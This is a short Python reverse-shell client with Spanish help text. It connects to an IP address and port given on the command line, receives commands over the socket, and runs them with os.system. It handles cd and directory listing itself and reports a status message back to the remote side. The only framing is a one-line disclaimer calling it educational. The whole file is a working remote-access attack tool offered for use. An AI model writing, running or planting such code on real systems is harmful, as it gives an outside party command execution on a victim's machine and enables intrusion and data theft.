#!/usr/bin/python3
#-*-coding: utf-8-*-
from socket import *
import os
from sys import argv


def h():
	print("Este programa fue creado con fines didacticos, el mal uso dado es responsabilidad del usuario.")
	print("-i: Aquí debes de poner la ip de a donde se va a conectar..")
	print("-p: Puerto por el que se va a conectar.")
	exit()

if __name__ == '__main__':
	if len(argv) < 5 and argv[1] != "-h" or len(argv) > 5:
	    print("{} -h para ver las opciones.".format(argv[0]))
	    exit()
	else:
		argcount = 0
		ip = str()
		port = 0
		for arg in argv:
			if arg[0] != "-":
				argcount += 1
				continue
			elif arg == "-h":
				h()
			elif arg == "-p":
				try:
					port = int(argv[argcount + 1])
				except:
					print("{} no es un numero valido.".format(argv[argcount + 1]))
					exit()
			elif arg == "-i":
				ip = str(argv[argcount + 1])
			else:
				print("{} no se reconoce como una bandera valida.".format(arg))
				exit()
			argcount += 1
		try:
			sock = socket(AF_INET, SOCK_STREAM)
			sock.connect((ip, port))
		except Exception as e:
			print("No se ha podido conectar a {} por el puerto {}.\n".format(ip, port, e))
			exit()
		else:
			while True:
				cmd = sock.recv(1024).decode()
				if cmd[:2] == "cd":
					try:
						os.chdir(cmd[2:])
					except:
						answ = "El sistema no pudo reconocer la ruta especificada.\n{}".format(os.getcwd())
					else:
						answ = "{}".format(os.getcwd())
				elif cmd[:2] == "ls" or cmd[:3] == "dir":
					try:
						answ = "{}\n{}".format(os.getcwd(), os.listdir())
					except:
						answ = os.getcwd()
				else:
					try:
						os.system(cmd)
						answ = "Se ha ejecutado el comando correctamente."
					except:
						answ = "No se ha podido ejecutar el comando."		
				sock.send(answ.encode())


